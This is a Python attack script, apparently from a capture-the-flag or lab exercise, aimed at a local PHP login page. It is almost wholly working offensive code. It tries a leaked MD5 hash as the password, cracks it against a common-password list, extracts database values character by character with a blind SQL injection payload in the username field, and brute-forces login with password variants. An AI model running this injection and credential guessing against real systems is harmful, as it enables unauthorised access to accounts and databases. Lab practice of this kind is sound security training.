import requests
import time

TARGET_URL = "http://127.0.0.1:33038/index.php"

hash_value = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Testing various password input methods")

# Test 1: Try the hash as-is
print("\n[*] Test 1: Login with hash as password")
data = {"username": "admin", "password": hash_value, "submit": "submit"}
response = requests.post(TARGET_URL, data=data)
print(f"[*] Result: {response.text}")

# Test 2: Try uppercase hash
print("\n[*] Test 2: Login with uppercase hash")
data = {"username": "admin", "password": hash_value.upper(), "submit": "submit"}
response = requests.post(TARGET_URL, data=data)
print(f"[*] Result: {response.text}")

# Test 3: Try the hash with common salts
print("\n[*] Test 3: Trying password cracking with salts...")
import hashlib

test_passwords = [
    "admin", "password", "payroll", "paybuddies", "hr", "123456",
    "P@ssw0rd", "Admin123", "welcome", "letmein", "secret", "flag",
    "user", "test", "qwerty", "login", "hradmin", "portal"
]

print("[*] Checking MD5 hashes of common passwords:")
for pwd in test_passwords:
    md5_hash = hashlib.md5(pwd.encode()).hexdigest()
    if md5_hash == hash_value:
        print(f"[+] CRACKED! Plain password is: '{pwd}' -> MD5: {md5_hash}")
        break
else:
    print("[!] No match found with common passwords")

# Look for other users
print("\n[*] Looking for other users in the database...")

# Since only admin exists, let's try dumping with different methods
print("\n[*] Attempting to extract username directly:")

def char_at_position(query, position, charset):
    """Check what character is at a position"""
    for char in charset:
        payload = f"admin' AND SUBSTRING(({query}),{position},1)='{char}'-- -"
        data = {"username": payload, "password": "test", "submit": "submit"}
        response = requests.post(TARGET_URL, data=data)
        if '"password"' in response.text:
            return char
        time.sleep(0.02)
    return None

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Extract the username to confirm
username_query = "SELECT username FROM users WHERE username='admin'"
extracted_username = ""
for pos in range(1, 10):
    char = char_at_position(username_query, pos, CHARSET)
    if char:
        extracted_username += char
        print(f"[+] Position {pos}: '{char}' -> Username: {extracted_username}")
    else:
        break

print(f"\n[*] Confirmed username: {extracted_username}")

# Final attempt: try common passwords one more time with slight variations
print("\n[*] Final password attempts:")
additional_passwords = [
    "admin", "Admin", "ADMIN", "password", "Password", "PASSWORD",
    "payroll", "Payroll", "PAYROLL", "paybuddies", "Paybuddies",
    "7d39307ae824e70052c0aa16816a9b16", "HR2024", "hr2024", "Hr2024"
]

for pwd in additional_passwords:
    data = {"username": "admin", "password": pwd, "submit": "submit"}
    response = requests.post(TARGET_URL, data=data)
    if '"Success"' in response.text:
        print(f"[+] FOUND IT! Password is: '{pwd}'")
        break
else:
    print("[!] None of the tested passwords worked")
